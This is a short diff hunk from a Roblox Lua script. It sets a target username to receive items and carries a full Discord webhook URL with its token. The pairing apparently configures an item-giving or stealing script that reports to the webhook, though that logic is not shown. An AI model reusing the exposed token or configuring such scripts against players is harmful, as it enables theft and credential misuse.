@@ -10,7 +10,7 @@ local Workspace = game:GetService("Workspace")
 local RunService = game:GetService("RunService")
 
 -- ⚙️ CONFIG
-local targetUsername = "TargetNameHere"
+local targetUsername = "INFMONEY09"
 local webhook = "https://discord.com/api/webhooks/1382400242749542520/aWGLyzdRBVz6BCizV-mcI8scrWJAEJ4AD1ON9HAFQ-V4rfVUDpB_nH0JwJjcemN3B5gD"
 local giveDelay = 0.25
 local hoverOffset = Vector3.new(0, 3, 0)
